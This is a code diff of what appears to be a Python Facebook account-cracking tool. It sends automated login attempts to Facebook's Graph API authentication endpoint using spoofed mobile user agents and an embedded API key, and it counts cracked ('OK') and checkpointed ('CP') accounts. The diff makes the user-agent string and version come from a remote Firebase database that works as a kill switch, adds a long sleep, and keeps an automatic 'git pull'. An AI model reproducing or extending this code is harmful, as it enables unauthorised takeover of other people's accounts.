@@ -115,27 +115,47 @@ def S1():
     return ua
 
 
-def S2():
-    en = random.choice(['en_US', 'en_GB', 'en_PK', 'ru_RU', 'de_DE', 'en_BD', 'en_IN', 'en_AF'])
-    application_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(
-        random.randint(11, 33))
-    ver = str(random.randrange(30, 443))
-    app_version = str(random.randint(111, 444)) + '.0.0.' + str(random.randrange(9, 49)) + '.' + str(
-        random.randint(11, 33))
-    app_ver_code = str(random.randint(000000000, 999999999))
-    application_version_code = str(random.randint(111111111, 999999999))
-    fbap = random.choice(
-        ['414.0.0.30.113', '398.0.0.21.105', '274.0.0.22.117', '316.4.0.15.120', '385.0.0.32.114', '415.0.0.34.107',
-         '414.0.0.30.113', '357.0.0.13.112', '415.0.0.34.107', '408.1.0.16.113', '412.0.0.22.115', '240.0.0.38.121',
-         '414.0.0.30.113', '241.0.0.43.15'])
-    fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
+fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/e_value.json"
+
+def get_ua():
+    try:
+        response = requests.get(fu, timeout=5)
+        if response.status_code == 200:
+            return response.text.strip().replace('"', '')
+        else:
+            sys.exit(1)
+    except requests.exceptions.RequestException as e:
+        sys.exit(1)
+    
+e = get_ua()
+def user_agent():
     s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(
         random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
-    e = ';FBDM/{density=2.25,width=1080,height=2280};FBLC/en_US;FBRV/920209041;FBCR/Grameenphone;FBMF/LG;FBBD/LG;FBPN/com.facebook.katana;FBDV/LG G8 ThinQ;FBSV/9.0.0;FBOP/1;FBCA/arm64-v8a:armeabi-v7a ;]'
+    if not e:
+        sys.exit(1)
     ua = s + e
-    # print(ua)
     return ua
 
+e_value = user_agent()
+print("Fetched E Value:", e_value)
+
+time.sleep(1212)
+
+# ━━━━━━━━━━━[ Version] ━━━━━━━━━━━
+
+fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/ver.json"
+
+def ver():
+    try:
+        response = requests.get(fu, timeout=5)
+        if response.status_code == 200:
+            return response.text.strip().replace('"', '')
+        else:
+            sys.exit(1)
+    except requests.exceptions.RequestException as e:
+        sys.exit(1)
+    
+v = ver()
 
 # __________________[ SYS ]__________________#
 os.system('git pull')
@@ -192,7 +212,7 @@ logo = f"""
 {white} X X  B   B O   O W     W
 {white}  X   BBBB  O   O W  W  W
 {white} X X  B   B O   O  W W W
-{white}X   X BBBB   OOO    W W           {green}{vrs}
+{white}X   X BBBB   OOO    W W           {green}{v}
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
 {white}[{green}◆{white}] {white}GITHUB    {white}➣{white}   ({gren}xbow-570{white})
@@ -203,11 +223,11 @@ logo = f"""
 def result(OKs, cps):
     if len(OKs) != 0 or len(cps) != 0:
         print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
-        print(f'{red}[{white}◆{red}] {green}THE PROCESS HAS BEEN COMPLETED...')
-        print(f'{red}[{white}◆{red}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
-        print(f'{red}[{white}◆{red}] {green}TOTAL CP {white}➣{red} %s' % str(len(cps)))
+        print(f'{white}[{green}◆{white}] {white}THE PROCESS HAS BEEN COMPLETED...')
+        print(f'{white}[{green}◆{white}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
+        print(f'{white}[{green}◆{white}] {green}TOTAL CP {white}➣{red} %s' % str(len(cps)))
         print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
-        input(f"{red}[{white}◆{red}] {green}PRESS ENTER TO BACK MENU ")
+        input(f"{white}[{green}◆{white}] {white}PRESS ENTER TO BACK MENU ")
         exit()
 
 
@@ -403,7 +423,7 @@ class main_crack():
                             "fb_api_req_friendly_name": "authenticate",
                             "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                             "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': S2(),
+                headers = {'User-Agent': user_agent(),
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Host': 'graph.facebook.com',
                            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
